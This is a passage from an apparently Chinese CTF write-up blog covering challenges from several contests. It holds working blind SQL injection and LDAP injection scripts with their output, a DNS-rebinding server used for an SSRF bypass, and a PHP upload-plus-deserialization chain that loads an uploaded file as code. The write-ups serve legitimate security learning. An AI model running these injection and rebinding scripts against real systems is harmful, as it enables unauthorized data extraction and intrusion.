class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_lengths</span>():<span class="comment">#admin 20 fll11144aag 10</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;/**/and/**/(select/**/length(group_concat(ff1lllaggg))/**/&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from/**/fll11144aag)=%d#&quot;</span>%i</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">        txt = requests.post(url, data=data).text</span><br><span class="line">        <span class="built_in">print</span>(txt)</span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_values</span>(<span class="params"><span class="built_in">len</span></span>):<span class="comment">#admin id,username,password fll11144aag ff1lllaggg</span></span><br><span class="line"></span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_range:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;/**/and/**/(select/**/ascii(substr(group_concat(ff1lllaggg)/**/from/**/%d/**/for/**/1))&quot;</span> \</span><br><span class="line">                      <span class="string">&quot;/**/from/**/fll11144aag)=%d#&quot;</span> %(i,j)</span><br><span class="line">            data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">            txt = requests.post(url, data=data).text</span><br><span class="line">            <span class="built_in">print</span>(txt)</span><br><span class="line">            <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#print(dbs_len())</span></span><br><span class="line">    <span class="comment">#print(table_lengths())</span></span><br><span class="line">    <span class="comment">#print(table_names(17))</span></span><br><span class="line">    <span class="comment">#print(column_lengths())</span></span><br><span class="line">    <span class="comment">#print(column_names(10))</span></span><br><span class="line">    <span class="comment">#print(data_lengths())</span></span><br><span class="line">    <span class="built_in">print</span>(data_values(<span class="number">63</span>))</span><br></pre></td></tr></table></figure>



<h2 id="simple-bypass"><a href="#simple-bypass" class="headerlink" title="simple-bypass"></a>simple-bypass</h2><p>dns重绑定+ssrf，这题当时没做出来</p>
<p><img src="https://s2.loli.net/2022/06/06/S1G8cXkYsjbhtOZ.png" alt="img"></p>
<p>本题需要访问&#x2F;admin-status，并且只能由内网访问，于是考虑ssrf，但本题传入的域名在后端经过了判断，首先连续解析16次，若出现了内网地址则直接返回hacker，在第17次时访问</p>
<p>首先想到的思路是用自建的dns服务器解析，在前16次解析为一个合法的ip地址，再在第17次请求127.0.0.1</p>
<p><img src="https://s2.loli.net/2022/06/06/A6RIjb5dK4789mH.png" alt="img"></p>
<p>需要有一个可以使用的域名，将子域名test.h4cking2thegate.top指向由ns.h4cking2thegate.top来解析，再将ns.h4cking2thegate.top解析为我们服务器的ip地址，接下来只用在服务器上运行dns脚本，并请求子域名test.h4cking2thegate.top即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">keyword = <span class="string">&#x27;h4cking2thegate.top&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DynamicResolver</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_doDynamicResponse</span>(<span class="params">self, query</span>):</span><br><span class="line">        <span class="keyword">global</span> count</span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> name:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">17</span> != <span class="number">0</span>:</span><br><span class="line">                ip=<span class="string">&quot;110.242.68.3&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">&quot;110.242.68.3&quot;</span></span><br><span class="line"><span class="comment"># if name not in record: #     record[name]=0</span></span><br><span class="line"><span class="comment"># record[name]+=1</span></span><br><span class="line">        <span class="built_in">print</span> (count)</span><br><span class="line">        <span class="built_in">print</span> (name + <span class="string">&quot; ===&gt; &quot;</span> + ip )</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            <span class="built_in">type</span>=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">1</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b&#x27;%s&#x27;</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">self, query, timeout=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">&#x27;/etc/resolv.conf&#x27;</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">5333</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>

<p>在服务器上收到的回显如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@iZ2zec7mjp663ump9wsug3Z:~/payloads<span class="comment"># python DNS_rebinding.py </span></span><br><span class="line">1</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">2</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">3</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">4</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">5</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">6</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">7</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">8</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">9</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">10</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">11</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">12</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">13</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">14</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">15</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">16</span><br><span class="line">test.h4cking2thegate.top ===&gt; 110.242.68.3</span><br><span class="line">17</span><br><span class="line">test.h4cking2thegate.top ===&gt; 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://s2.loli.net/2022/06/06/LDfswloa7FW9BnP.png" alt="img"></p>
<h1 id="Misc方向："><a href="#Misc方向：" class="headerlink" title="Misc方向："></a>Misc方向：</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><p>slack群里直接拿flag，真签到</p>
<h2 id="easter-flag"><a href="#easter-flag" class="headerlink" title="easter flag"></a>easter flag</h2><p>公众号文章中拿到神秘16进制字符串，用hex转汉字，gbk解码</p>
<h2 id="TsarrrBomba-baby"><a href="#TsarrrBomba-baby" class="headerlink" title="TsarrrBomba(baby)"></a>TsarrrBomba(baby)</h2><p><img src="https://s2.loli.net/2022/06/06/RTQMndaik3scrCm.png" alt="img"></p>
<p>本题附件是一个bin文件，用010查看后发现了文件头的GIF89a，确认为gif图，拿到Stegsolve里逐帧查看，将得到的字母一个一个拼接得到flag，由于图中字母非常不清晰，需要尝试</p>
<h2 id="mirrorrr-revenge"><a href="#mirrorrr-revenge" class="headerlink" title="mirrorrr_revenge"></a>mirrorrr_revenge</h2><p>拿到图片后用010打开，下方爆错，提示crc32错误，可以猜想到本题所给图片的宽高错误</p>
<p>于是使用脚本来爆破crc32得到正确宽高</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">open</span>(<span class="string">&quot;mirror.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0xE82F0D63</span>:<span class="comment">#根据不同的照片，此处CRC32的值每次需要改写</span></span><br><span class="line">            k = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>修复图片后，就不知道怎么做了</p>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>SQL注入</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>东软杯 DNUICTF-Web（部分）</title>
    <url>/2021/12/11/DNUICTF-Web/</url>
    <content><![CDATA[<h1 id="签到-flag"><a href="#签到-flag" class="headerlink" title="[签到] flag"></a>[签到] flag</h1><p><img src="https://img-blog.csdnimg.cn/cf0206e9e2a041b9b0ed51b0cd60d3b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/4f5fdc77be1d450fabffa2a32aaeceaa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>把得到的字符拼接再b64解码得到flag</p>
<h1 id="odd-upload"><a href="#odd-upload" class="headerlink" title="odd_upload"></a>odd_upload</h1><p><img src="https://img-blog.csdnimg.cn/2d9f4cfec34449a887dbaa53c46b7333.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目环境中有一个文件上传功能，还可以指定保存路径，经过简单尝试后发现本题后端黑名单包括了php和apache配置文件，但是没有包括tpl模板文件<br>smarty框架的模板文件存放在<code>/templates</code>中，可以直接上传同名的<code>index.tpl</code>文件来覆盖原本的tpl文件进行模板注入</p>
<p><img src="https://img-blog.csdnimg.cn/3f5c3ed19e1b470c882501fe6cddf2f0.png" alt="在这里插入图片描述"></p>
<p>成功上传后访问index.php看看渲染的输出</p>
<p><img src="https://img-blog.csdnimg.cn/ea4c667440a640db9bbcc4e83addb07e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>直接在环境变量中找到flag</p>
<h1 id="easyinject"><a href="#easyinject" class="headerlink" title="easyinject"></a>easyinject</h1><p><img src="https://img-blog.csdnimg.cn/2cfc8b79e1534e849a1ccabd78f07b98.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开题目是一个简单的登陆界面，在注释中找到一对用户名和密码<br>尝试登陆后，提示flag是一个特殊的用户名，由<code>a-z0-9_</code>组成，看到题目时都会想到需要sql盲注得到用户名，但是尝试各种payload后发现无效</p>
<p><img src="https://img-blog.csdnimg.cn/e12afab296fa45419138ce565d4d82dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>经过尝试，当输入的值中含有括号时会产生如上报错，从报错信息中可知登陆信息是存储在LDAP数据库中的，关于LDAP的介绍可以看这位大佬的博客<br><a href="https://blog.csdn.net/quiet_girl/article/details/50716312">LDAP的注入与防护</a></p>
<p>经过简单判断可以大致推测登陆的后端检验语句应该是这样的<br><code>(&amp;(USER=Uname)(PASSWORD=Pwd))  </code><br>用<code>&amp;</code>来连接两个条件对数据库中的数据进行查询<br>传入的值里面还可以使用通配符<code>*</code><br><img src="https://img-blog.csdnimg.cn/b303657217104005b9e01971b7c66555.png" alt="在这里插入图片描述"><br>当传入这种用户名的时候依然可以登录成功</p>
<p>我们可以以此来进行布尔盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://47.106.172.144:2333/&#x27;</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;_0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">success=<span class="string">&#x27;密码错误&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left</span>():</span><br><span class="line">    result=<span class="string">&#x27;_*&#x27;</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;<span class="number">37</span>):</span><br><span class="line">        c=<span class="built_in">str</span>[i]</span><br><span class="line">        login=&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">f&#x27;*<span class="subst">&#123;c&#125;</span>&#x27;</span>+result,<span class="string">&#x27;pass&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">        r=requests.get(url,params=login)</span><br><span class="line">        txt=r.text</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            result=c+result</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right</span>():</span><br><span class="line">    result=<span class="string">&#x27;*_&#x27;</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;<span class="number">37</span>):</span><br><span class="line">        c=<span class="built_in">str</span>[i]</span><br><span class="line">        login=&#123;<span class="string">&#x27;user&#x27;</span>:result+<span class="string">f&#x27;<span class="subst">&#123;c&#125;</span>*&#x27;</span>,<span class="string">&#x27;pass&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">        r=requests.get(url,params=login)</span><br><span class="line">        txt=r.text</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            result=result+c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">left()</span><br><span class="line">right()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">i_*</span></span><br><span class="line"><span class="string">li_*</span></span><br><span class="line"><span class="string">pli_*</span></span><br><span class="line"><span class="string">apli_*</span></span><br><span class="line"><span class="string">dapli_*</span></span><br><span class="line"><span class="string">ldapli_*</span></span><br><span class="line"><span class="string">*_1</span></span><br><span class="line"><span class="string">*_1s</span></span><br><span class="line"><span class="string">*_1s_</span></span><br><span class="line"><span class="string">*_1s_v</span></span><br><span class="line"><span class="string">*_1s_v3</span></span><br><span class="line"><span class="string">*_1s_v3r</span></span><br><span class="line"><span class="string">*_1s_v3ry</span></span><br><span class="line"><span class="string">*_1s_v3ry_</span></span><br><span class="line"><span class="string">*_1s_v3ry_e</span></span><br><span class="line"><span class="string">*_1s_v3ry_ez</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;ldapli_1s_v3ry_ez&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>TSCTF 2022 - Web</title>
    <url>/2022/04/25/TSCTF2022/</url>
    <content><![CDATA[<h1 id="BabyPHP"><a href="#BabyPHP" class="headerlink" title="BabyPHP"></a>BabyPHP</h1><p><img src="https://img-blog.csdnimg.cn/c7fe67cc6b9042ba8a8a0c29fdb0cbee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>扫目录发现源码泄露，访问&#x2F;<a href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$dst</span> = <span class="string">&#x27;/var/www/html/不告诉你&#x27;</span>;</span><br><span class="line"><span class="variable">$fileinfo</span> = <span class="keyword">array</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>],<span class="variable">$dst</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;<span class="subst">$fileinfo</span>[1]/<span class="subst">$fileinfo</span>[0]&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$fileinfo</span>[<span class="number">0</span>] . <span class="string">&quot; has already existed :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$cat</span>-&gt;data=<span class="variable">$fileinfo</span>[<span class="number">0</span>];</span><br><span class="line">	<span class="variable">$cat</span>-&gt;<span class="title function_ invoke__">upload_check</span>();</span><br><span class="line">	<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;<span class="subst">$fileinfo</span>[1]/<span class="subst">$fileinfo</span>[0]&quot;</span>);</span><br><span class="line">	<span class="variable">$msg</span>=<span class="string">&quot;file name:%s&quot;</span>;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$fileinfo</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$msg</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$msg</span>, <span class="variable">$value</span>);                  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上传路径<code>$dst</code>放在了<code>$fileinfo[1]</code>中，想要foreach输出上传路径就要让<code>$fileinfo[0]</code>包含字符串<code>%s</code>，从而在第二次循环中输出路径<br><img src="https://img-blog.csdnimg.cn/61dc3eae50424c40a8c16d086ae4725b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>注释中有提示<code>&lt;!-- /var/www/html/******blablabla******/cat.php --&gt;</code><br>合理猜测路径为<code>/var/www/html/y0u_wi1l_n3v3r_f1nd/cat.php</code>，由于cat.php没用给出源码，在注释中可以看到<br><img src="https://img-blog.csdnimg.cn/c9c3b83faa354e488f33629bc4434d28.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以猜测cat.php的源码是用vim来恢复得到，访问<code>/.cat.php.swp</code>得到临时文件，再用<code>vim -r</code>恢复一下就可以得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h4 align=&#x27;center&#x27;&gt;Hello&lt;/h4&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">waf</span>();</span><br><span class="line">    <span class="title function_ invoke__">spl_autoload_register</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$a</span>-&gt;data=<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">upload_check</span>()) &lt;= <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filenames</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$filenames</span>=<span class="string">&#x27;test.test&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filenames</span>,<span class="string">&#x27; test&#x27;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- yep, I need to learn vim. --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>审计代码可知<code>spl_autoload_register();</code>可以自动加载未定义的类，而后面又有filenames参数的反序列化，可以先上传恶意文件，再用反序列化读取，触发恶意代码，<code>spl_autoload_register();</code>支持的文件类型有.inc和.php，由于文件上传处php被ban了，所以只能上传inc文件，再用反序列化去触发，可以先传一个phpinfo探路<br><img src="https://img-blog.csdnimg.cn/be8fe9e514ca4abdb28c8b3542682797.png" alt="在这里插入图片描述"><br>想要反序列化就必须满足传入的参数小于8位，原本的<code>O:1:&quot;p&quot;:0:&#123;&#125;</code>可以缩减成<code>O:1:&quot;p&quot;:</code>恰好8位，成功触发后查看一下禁用函数，发现system不能用，换一换其他函数<br><img src="https://img-blog.csdnimg.cn/4e3c9aae73ca4d93a4ebd438006a3196.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/25800eabc5174140b20fba5e65b384d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="ezphpaudit"><a href="#ezphpaudit" class="headerlink" title="ezphpaudit"></a>ezphpaudit</h1><p>访问<code>/?source</code>拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--?source--&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fzip_open</span>(<span class="params"><span class="variable">$fzip</span> = <span class="string">&#x27;&#x27;</span>,<span class="variable">$tagdir</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$fzip</span>) &amp;&amp; <span class="title function_ invoke__">is_dir</span>(<span class="variable">$tagdir</span>)) &#123;</span><br><span class="line">        <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="variable">$status</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$fzip</span>);</span><br><span class="line">            <span class="variable">$status</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$tagdir</span>);</span><br><span class="line">            <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$status</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveSqlFile</span>(<span class="params"><span class="variable">$old_path</span>, <span class="variable">$target_path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$old_path</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">false</span> !== <span class="variable">$file</span> = (<span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> == <span class="string">&#x27;.&#x27;</span> || <span class="variable">$file</span> == <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$substr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$substr</span> === <span class="string">&#x27;.sql&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">rename</span>(<span class="variable">$old_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>, <span class="variable">$target_path</span> . <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$old_path</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">deldir</span>(<span class="variable">$old_path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldir</span>(<span class="params"><span class="variable">$dir</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//先删除目录下的文件：</span></span><br><span class="line">    <span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span 